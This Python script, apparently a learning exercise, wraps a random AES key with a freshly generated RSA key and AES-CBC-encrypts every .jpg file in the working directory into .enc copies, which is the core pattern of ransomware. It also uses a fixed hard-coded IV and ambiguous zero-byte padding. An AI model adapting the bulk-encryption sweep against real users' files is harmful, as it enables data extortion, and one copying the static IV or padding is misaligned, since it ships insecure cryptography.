from Crypto.Cipher import AES
import hashlib
import glob
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
import sys
rsa = RSA.generate(2048)
privateK = rsa.exportKey()
publicK =rsa.public_key().exportKey()

with open('public_key.pem','wb') as f :
    f.write(publicK)

with open('private_key.pem','wb') as f:
    f.write(privateK)

with open('public_key.pem','rb') as f :
    publicK = f.read()

rsa_pubkey = RSA.importKey(publicK)
key = get_random_bytes(32)
cipher = PKCS1_OAEP.new(rsa_pubkey)

encrypted_key = cipher.encrypt(key)

with open('encrypted.pem','wb') as f:
    f.write(encrypted_key)






# def padded_str(entry):
#     while len(entry)%16 != 0:
#         entry = entry + " "
#     return entry

def padded(entry):
    while len(entry)%16 != 0:
        entry = entry + b'0'
    return entry
#
mode = AES.MODE_CBC
# message = "this is my super secret"
# message = padded_str(message)
# message = message.encode()
# with open('Beach.jpg','rb') as f:
#     orig_file = f.read()
file = glob.glob('*jpg')

for f in file:

    openfile = open(f,"rb")
    openfile = openfile.read()




    IV = 'This is an IV123'.encode()
    cipher = AES.new(key, mode, IV)
    cipher = cipher.encrypt(padded(openfile))

    with open( f +'.enc', 'wb') as e:
        e.write(cipher)


# with open('Book1.xlsx','rb') as f:
#      orig_file = f.read()


#


#
#

# print(cipher)



# with open('encrypted_xlsx.out','wb') as e:
#     e.write(orig_file)